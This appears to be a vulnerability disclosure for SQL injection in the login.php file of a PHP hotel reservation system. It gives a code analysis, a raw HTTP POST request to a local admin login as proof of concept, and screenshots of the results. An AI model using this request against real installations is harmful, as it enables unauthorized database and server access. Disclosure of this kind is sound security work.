# Simple Online Hotel Reservation System

## supplier 
https://code-projects.org/simple-online-hotel-reservation-system-in-php-with-source-code
## Vulnerability file
login.php

## describe

**Code analysis**   

In the login.php file of Simple Online Hotel Reservation System, theuser username parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/5fc8f5f7-f5fe-42c4-ae86-d818e9440523.png)


## POC

```
POST /simplehotel/HOR/admin/ HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 28
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/simplehotel/HOR/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=s5o8pk3psueru08ci1jjc6b3if
Connection: close

username=1&password=1&login=

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/861e26ad-13ad-4b5e-954e-139dcd8af444.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/b051aab6-fb22-4c66-82a1-a41f30b89a37.png)